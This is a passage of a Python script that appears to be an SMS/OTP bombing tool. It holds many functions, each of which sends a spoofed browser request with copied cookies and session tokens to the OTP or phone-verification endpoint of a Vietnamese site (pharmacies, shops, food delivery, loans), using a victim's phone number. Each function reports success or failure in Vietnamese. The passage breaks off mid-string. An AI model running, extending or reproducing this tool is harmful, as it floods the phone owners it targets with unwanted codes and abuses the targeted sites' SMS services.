        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'from': 'ZALO',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDIGOZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pharmartzl():
    cookies = {
        'bppsession2021': 'hpnqaavn1thqs7b60t2egvfq3skqu8cm',
        'isAT': '0',
        'viteexConfig': '%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D',
        'mp_sid': '1728810818243.1506',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'bppsession2021=ms0ocs045k27kqmte9sddlq122054ifo; isAT=0; viteexConfig=%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D; mp_sid=1721792970118.5579',
        'origin': 'https://www.pharmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.pharmart.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'type': 'zalo',
    }

    try:
        response = requests.post('https://www.pharmart.vn/send-otp', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PHARMARTZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PHARMARTZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pharmartsms():
    cookies = {
        'bppsession2021': 'hpnqaavn1thqs7b60t2egvfq3skqu8cm',
        'isAT': '0',
        'viteexConfig': '%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D',
        'mp_sid': '1728810818243.1506',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'bppsession2021=ms0ocs045k27kqmte9sddlq122054ifo; isAT=0; viteexConfig=%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D; mp_sid=1721792970118.5579',
        'origin': 'https://www.pharmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.pharmart.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'type': 'sms',
    }

    try:
        response = requests.post('https://www.pharmart.vn/send-otp', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PHARMARTSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PHARMARTSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def medigosms():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDIGOSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ddmevabe():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://dinhduongmevabe.com.vn',
        'Referer': 'https://dinhduongmevabe.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'userName': sdt,
    }

    try:
        response = requests.post('https://api.dinhduongmevabe.com.vn/api/User/GetVerifyPhoneNumberCode', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DDMEVABE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DDMEVABE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': sdt,
        'languageCode': 'vi',
    }

    try:
        response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MOCHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def sigo():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://sigo.vn',
        'priority': 'u=1, i',
        'referer': 'https://sigo.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'UI_StartAt': 1721879135577,
        'UI_FirstID': 'q633_1721879105606',
        'AppName': 'sigoweb',
        'Url': 'https://sigo.vn/bang-gia-thue-xe-tu-lai-theo-ngay',
        'DocumentWidth': 1920,
        'MobilePhone': sdt,
        'ActionType': 'register',
        'UI_TimezoneOffset': -420,
    }

    try:
        response = requests.post('https://api.sigo.vn/api/v1/Account/GetOTP', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SIGO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SIGO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mamanbebe():
    cookies = {
        'PHPSESSID': 'halbmnosvptpt5m03q2l89ofdd',
        'form_key': 'RV7ffxpuWamLI9TI',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'form_key': 'RV7ffxpuWamLI9TI',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'PHPSESSID=halbmnosvptpt5m03q2l89ofdd; form_key=RV7ffxpuWamLI9TI; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; form_key=RV7ffxpuWamLI9TI',
        'Origin': 'https://mamanbebe.vn',
        'Referer': 'https://mamanbebe.vn/customer/account/create/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'number_phone': sdt,
        'form_key': 'RV7ffxpuWamLI9TI',
        'currentUrl': 'https://mamanbebe.vn/customer/account/create/',
    }

    try:
        response = requests.post('https://mamanbebe.vn/sms_vietguys/otp/sendOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MAMANBEBE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MAMANBEBE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def tatmart():
    cookies = {
        'sid_customer_6c986': '3860535321c041d920d9d9ed68e7d044-C',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'sid_customer_6c986=3860535321c041d920d9d9ed68e7d044-C',
        'origin': 'https://www.tatmart.com',
        'priority': 'u=1, i',
        'referer': 'https://www.tatmart.com/profiles-add/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'dispatch': 'tat_commons.verifi_phone',
    }

    data = {
        'phone': sdt,
        'skip_noti': 'true',
        'security_hash': '5751fb15de53985c76fe604de779432e',
        'is_ajax': '1',
    }

    try:
        response = requests.post('https://www.tatmart.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TATMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TATMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hacom():
    cookies = {
        'fcb677da6e48f7e29e4e541120b3608f': 'u9qe3f8u2a9jj060f3tu4mitg2',
        'uID': 'tXp8lmM9XXHFe5J1PcUe',
        '__session:0.6773658427370488:': 'https:',
        'shopping_cart_store': 'LQ==',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'fcb677da6e48f7e29e4e541120b3608f=u9qe3f8u2a9jj060f3tu4mitg2; uID=tXp8lmM9XXHFe5J1PcUe; __session:0.6773658427370488:=https:; shopping_cart_store=LQ==',
        'origin': 'https://hacom.vn',
        'priority': 'u=1, i',
        'referer': 'https://hacom.vn/linh-kien-may-tinh',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'user',
        'action_type': 'send-mobile-login-code',
        'mobile': sdt,
    }

    try:
        response = requests.post('https://hacom.vn/ajax/post.php', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HACOM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HACOM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def liena():
    cookies = {
        'form_key': '16TAQkcEJWNL9mpA',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'PHPSESSID': 'dc89004ebe3f7d6ddcf4413416fe8486',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'form_key=16TAQkcEJWNL9mpA; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; PHPSESSID=dc89004ebe3f7d6ddcf4413416fe8486',
        'origin': 'https://www.liena.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.liena.com.vn/?gad_source=1&gclid=CjwKCAjw9eO3BhBNEiwAoc0-jTqAbel8_7VQKkVBrv--8QcKLRdxat-thOoWRBU8OQYaV6eYP3LvqhoC7vQQAvD_BwE',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
    }

    try:
        response = requests.post(
            'https://www.liena.com.vn/rest/V1/liena/customer/login/request-otp',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("LIENA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LIENA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def gofood():
    cookies = {
        'ci_session': '1da3rhie59qq8r85pa5vt7arqg5gt4oo',
        'csrf_cookie_name': '300aa3e9b94c3b8b5404ae0e713dd834',
        'area_code': 'HN',
        'isChooseArea': '1',
        'popup_time': '1',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'ci_session=1da3rhie59qq8r85pa5vt7arqg5gt4oo; csrf_cookie_name=300aa3e9b94c3b8b5404ae0e713dd834; area_code=HN; isChooseArea=1; popup_time=1; G_ENABLED_IDPS=google',
        'origin': 'https://gofood.vn',
        'priority': 'u=0, i',
        'referer': 'https://gofood.vn/dang-nhap',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://gofood.vn/dang-nhap', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GOFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GOFOOD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pasgo():
    cookies = {
        'CHECK_COOKIES': '1',
        'MESSAGE_UNREAD': 'NaN',
        'PASGOID': '',
        '__RequestVerificationToken': 'lQ-nalLi-ZKbGr-kL_pNhY-4ZViMskpa5trJotI1HyNg866AKdvrhAUfhc1IcvhX4KBnEuO9XL6vVhxHoDtM_duUjY_QmJF_VPbWZDKNsec1',
        'ASP.NET_SessionId': '2rfy0ruzurubkff324um1u0z',
        'PROVINCE_ID_COOKIES': '2',
        'PROVINCE_NAME_COOKIES': 'H%e1%bb%93+Ch%c3%ad+Minh',
        'PROVINCE_ALIAS_COOKIES': 'ho-chi-minh',
        'viteexConfig': '%7B%22app_id%22%3A%22DnZ4G2DeWz%22%2C%22app_domain%22%3A%22https%3A//pasgo.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3Anull%2C%22not_ask_allow_in_day%22%3A0%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D',
        'ls-user-name': 'Guest-FDDB-38399687',
        'mp_sid': '1721975642612.2136',
        'CONFIRM_SMS_COOKIES': f'%7b%22Imei%22%3a%22171.224.178.63%22%2c%22MaQuocGia%22%3a%22%2b84%22%2c%22Sdt%22%3a%22%2b{sdt}%22%2c%22MaKichHoat%22%3anull%2c%22MatKhau%22%3a%22f5bb0c8de146c67b44babbf4e6584cc0%22%2c%22MaNguoiGioiThieu%22%3a%22123456%22%2c%22TinhId%22%3a2%2c%22TenNguoiDung%22%3a%22quoc+trnh+tran%22%2c%22Email%22%3anull%2c%22GioiTinh%22%3atrue%2c%22ReturnUrl%22%3a%22%2fkich-hoat%22%2c%22IsRegister%22%3atrue%2c%22TypeToken%22%3a0%2c%22Token%22%3a%22%22%2c%22Birth%22%3a%22%22%2c%22SocialId%22%3a%22%22%7d',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Referer': 'https://pasgo.vn/dang-ky?returnUrl=%2Fkich-hoat',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        response = requests.get('https://pasgo.vn/kich-hoat', cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PASGO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PASGO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietloan():
    cookies = {
        '_gcl_au': '1.1.1637479389.1722410837',
        '_tt_enable_cookie': '1',
        '_ttp': 'BCNl-9LA0i0a8YqJWV2Veir4WGy',
        '_clck': '8x261n%7C2%7Cfnx%7C0%7C1673',
        'mousestats_vi': 'e6c32520217f71487615',
        '_ym_uid': '1722410839843139251',
        '_ym_d': '1722410839',
        '_ga': 'GA1.2.1436947795.1722410837',
        '_ga_EBK41LH7H5': 'GS1.1.1722410836.1.1.1722411244.42.0.0',
        '__cfruid': '45970bfd55bca489226d2927b4345fda2687beca-1727599621',
        'XSRF-TOKEN': 'eyJpdiI6IkxYT0s4MnhBMEJqY2ZPKzh6WEorVWc9PSIsInZhbHVlIjoiZGswUURqamtubVBDck1nVEZJQVdqOU9BdkgrWEdaZEVwOUg2cTZLL3FqUVgzSzdPOWdQV2c0alFudWl0T3NKd1hVZzd2bDBUdnRzN1NBVVhQSmQ3eXlPM1RCbGt1aWJBMFMyb0d2ZUo1TmpsdjErejhUc3lsZW92VTFGRGlTUGYiLCJtYWMiOiIwMDNjOTc1YjViYTQ0YjYxYTliZmU0OTYyNjA4ZDI3MDEyNzBiYmYzZDdiODE4MGM3NDA5ZTNiYmRiNzZhZDg5IiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6IkxNL2szbnNUS29KTVhFV1VvMTBGSVE9PSIsInZhbHVlIjoiTmlTaGVmbWxxVjRpQzNrS2dZQi90MzJubys2L29iemp3U3BlZUFNZFVlZEtCbUhRS0J3em81d1dwM2ZFWFhUMHZxQkN4UlVHV3pYcnFiL3d2Lzdzd2tCY2ptdFFBQU9WL0pobzlXUXhNZVBKM2dhakJyTWxRUFBLeTRMVElPTVkiLCJtYWMiOiJhNjM3MTc2OGRjYTM3OTZhMTkyNTI0OWYxYThmNDBlZjg0MzEzZjM5ZWNlOWYyZThmZTQ3YjA1ZTE2OTdjYzk2IiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6Ik1SOUdhUm0wNnF2Z0ZadUZhT045MVE9PSIsInZhbHVlIjoiNDZ4S1h4dEdiOEJEeVdCM2Rub2dKSk43Z25CRnBBRTZsT2Y3OVlmeWs5QTVUL2NZUWNhakZmdXFuazEyUWIvMmZaemEwUm9wd2RlUTliVXFqbm5kbzRjZFp1N2dDNlRIYmE0cGxzdzRqWCtCWCtRVHRPSFN3Rmlmb1B5dTEvWFMiLCJtYWMiOiIwNTYxZjRhMGJlODdkMzRmNDlkY2VjM2Y0YWRhMjNhODk3NjhiZDA1ZjhjNTVhZTg5NmE3M2VhYWZhNTk2OTczIiwidGFnIjoiIn0%3D',
        'ec_cache_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_png_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_etag_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_etag_client': 'false',
        'ec_etag_client_utm': 'null',
        'uid': '632e6101-b428-93c3-3898-ca177175bb79',
        'client': 'false',
        'client_utm': 'null',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_gcl_au=1.1.1637479389.1722410837; _tt_enable_cookie=1; _ttp=BCNl-9LA0i0a8YqJWV2Veir4WGy; _clck=8x261n%7C2%7Cfnx%7C0%7C1673; mousestats_vi=e6c32520217f71487615; _ym_uid=1722410839843139251; _ym_d=1722410839; _ga=GA1.2.1436947795.1722410837; _ga_EBK41LH7H5=GS1.1.1722410836.1.1.1722411244.42.0.0; __cfruid=45970bfd55bca489226d2927b4345fda2687beca-1727599621; XSRF-TOKEN=eyJpdiI6IkxYT0s4MnhBMEJqY2ZPKzh6WEorVWc9PSIsInZhbHVlIjoiZGswUURqamtubVBDck1nVEZJQVdqOU9BdkgrWEdaZEVwOUg2cTZLL3FqUVgzSzdPOWdQV2c0alFudWl0T3NKd1hVZzd2bDBUdnRzN1NBVVhQSmQ3eXlPM1RCbGt1aWJBMFMyb0d2ZUo1TmpsdjErejhUc3lsZW92VTFGRGlTUGYiLCJtYWMiOiIwMDNjOTc1YjViYTQ0YjYxYTliZmU0OTYyNjA4ZDI3MDEyNzBiYmYzZDdiODE4MGM3NDA5ZTNiYmRiNzZhZDg5IiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IkxNL2szbnNUS29KTVhFV1VvMTBGSVE9PSIsInZhbHVlIjoiTmlTaGVmbWxxVjRpQzNrS2dZQi90MzJubys2L29iemp3U3BlZUFNZFVlZEtCbUhRS0J3em81d1dwM2ZFWFhUMHZxQkN4UlVHV3pYcnFiL3d2Lzdzd2tCY2ptdFFBQU9WL0pobzlXUXhNZVBKM2dhakJyTWxRUFBLeTRMVElPTVkiLCJtYWMiOiJhNjM3MTc2OGRjYTM3OTZhMTkyNTI0OWYxYThmNDBlZjg0MzEzZjM5ZWNlOWYyZThmZTQ3YjA1ZTE2OTdjYzk2IiwidGFnIjoiIn0%3D; 